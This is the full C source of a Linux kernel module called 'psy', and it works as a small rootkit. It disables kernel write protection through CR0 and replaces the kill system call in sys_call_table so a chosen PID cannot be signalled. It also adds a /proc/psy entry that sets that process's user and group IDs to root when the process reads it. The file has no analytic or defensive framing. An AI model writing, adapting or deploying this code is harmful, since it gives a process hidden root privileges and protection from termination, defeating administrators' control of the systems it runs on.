#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/sched/signal.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

static int psy_pid = 0;

static asmlinkage long (*og)(const struct pt_regs *);

extern void **sys_call_table;

static asmlinkage long hooked_kill(const struct pt_regs *regs)
{
  pid_t pid = regs->di;
  int sig = regs->si;

  if (pid == psy_pid)
    {
      printk(KERN_INFO "psy: kill attempt blocked for protected PID %d\n", pid);
      return -EPERM;
    }
  return og(regs);
}

void gRoot(void)
{
  if (current->pid == psy_pid)
    {
      struct cred *newcreds = prepare_creds();
      if (newcreds)
        {
          newcreds->uid.val = 0;
          newcreds->gid.val = 0;
          newcreds->euid.val = 0;
          newcreds->egid.val = 0;
          commit_creds(newcreds);
          printk(KERN_INFO "psy: root privileges granted to the protected PID %d\n", current->pid);
        }
    }
}

static int proc_show(struct seq_file *m, void *v)
{
  gRoot();
  seq_printf(m, "Protected process: %d\n", psy_pid);
  return 0;
}

static int proc_open(struct inode *inode, struct file *file)
{
  return single_open(file, proc_show, NULL);
}

static const struct file_operations proc_fops = {
    .owner   = THIS_MODULE,
    .open    = proc_open,
    .read    = seq_read,
    .llseek  = seq_lseek,
    .release = single_release,
};

static void disable_write_protection(void)
{
  write_cr0(read_cr0() & (~0x10000));
}

static void enable_write_protection(void)
{
  write_cr0(read_cr0() | 0x10000);
}

static int __init psy_init(void)
{
  if (psy_pid <= 0)
    {
      printk(KERN_INFO "psy: set a valid PID when loading the module (e.g. insmod psy.ko psy_pid=1234)\n");
      return -EINVAL;
    }

  disable_write_protection();
  og = sys_call_table[__NR_kill];
  sys_call_table[__NR_kill] = (void *)hooked_kill;
  enable_write_protection();

  proc_create("psy", 0, NULL, &proc_fops);

  printk(KERN_INFO "psy: loaded module. Protecting PID %d\n", psy_pid);
  return 0;
}

static void __exit psy_exit(void)
{
  disable_write_protection();
  sys_call_table[__NR_kill] = (void *)og;
  enable_write_protection();

  remove_proc_entry("psy", NULL);
  printk(KERN_INFO "psy: module unloaded\n");
}

module_param(psy_pid, int, 0);
MODULE_PARM_DESC(psy_pid, "PID of the process to be protected");
module_init(psy_init);
module_exit(psy_exit);

MODULE_LICENSE("GPL");
